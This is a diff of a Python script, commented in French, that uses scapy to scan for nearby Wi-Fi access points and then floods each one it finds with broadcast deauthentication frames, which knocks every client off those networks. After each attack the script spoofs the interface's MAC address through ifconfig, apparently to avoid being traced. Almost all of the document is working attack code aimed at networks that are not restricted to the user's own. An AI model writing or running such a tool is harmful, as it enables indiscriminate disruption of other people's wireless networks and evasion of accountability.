@@ -1,15 +1,17 @@
 import os
 import time
 import logging
-import threading
-from scapy.all import sniff, sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
+from scapy.all import *
 
 # Configuration du logging
 logging.basicConfig(level=logging.INFO)
 
-def scan_wifi(interface):
+# Définir l'interface à utiliser (e.g. wlan0, wlan1, etc.)
+interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi
+
+def scan_wifi():
     logging.info("Début du scan des réseaux Wi-Fi...")
-    packets = sniff(iface=interface, count=100, timeout=10)  # Correction ici
+    packets = sniff(iface=interface, count=100, timeout=10)
 
     networks = []
     for packet in packets:
@@ -18,34 +20,39 @@ def scan_wifi(interface):
             ssid = None
             for elt in packet[Dot11Elt]:
                 if elt.ID == 0:
-                    ssid = elt.info.decode("utf-8", errors='ignore')
+                    ssid = elt.info.decode("utf-8")
                     break
-            networks.append((mac_address, ssid if ssid else "Hidden"))
+            networks.append((mac_address, ssid))
 
-    logging.info(f"{len(networks)} réseaux trouvés.")
+    with open("networks.txt", "w") as f:
+        for network in networks:
+            f.write(f"{network[0]} - {network[1]}\n")
+
+    logging.info("Scan des réseaux Wi-Fi terminé.")
     return networks
 
-def send_deauth_packets(interface, ap_address):
-    packet = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address)/Dot11Deauth(reason=7)
+def deauth_attack(ap_address):
+    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address) / Dot11Deauth(reason=7)
+    
+    for _ in range(10):  # Attaque pendant 10 secondes
+        sendp(packet, iface=interface, verbose=0)
+        logging.info(f"Paquet de désauthentification envoyé à {ap_address}")
+        time.sleep(0.1)
 
-    for channel in range(1, 12):
-        os.system(f"iwconfig {interface} channel {channel}")
-        logging.info(f"Envoi de désauthentification sur le canal {channel} à {ap_address}")
-        for _ in range(10):  # Envoi pendant 10 secondes
-            sendp(packet, iface=interface, verbose=0)
-            time.sleep(1)
+def change_mac():
+    # Changer l'adresse MAC à une adresse aléatoire
+    new_mac = "00:11:22:33:44:55"  # Remplacez ceci par une adresse MAC valide
+    os.system(f"ifconfig {interface} down")
+    os.system(f"ifconfig {interface} hw ether {new_mac}")
+    os.system(f"ifconfig {interface} up")
+    logging.info(f"Adresse MAC changée en {new_mac}")
 
 if __name__ == "__main__":
-    interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi
-    networks = scan_wifi(interface)
+    networks = scan_wifi()
 
-    threads = []
-    for network in networks:
-        mac_address, ssid = network
-        logging.info(f"Envoi de désauthentification à {mac_address} (SSID: {ssid})")
-        thread = threading.Thread(target=send_deauth_packets, args=(interface, mac_address))
-        thread.start()
-        threads.append(thread)
-
-    for thread in threads:
-        thread.join()
+    with open("networks.txt", "r") as f:
+        for line in f:
+            mac_address = line.split(" - ")[0]
+            logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
+            deauth_attack(mac_address)
+            change_mac()  # Changer l'adresse MAC après chaque attaque
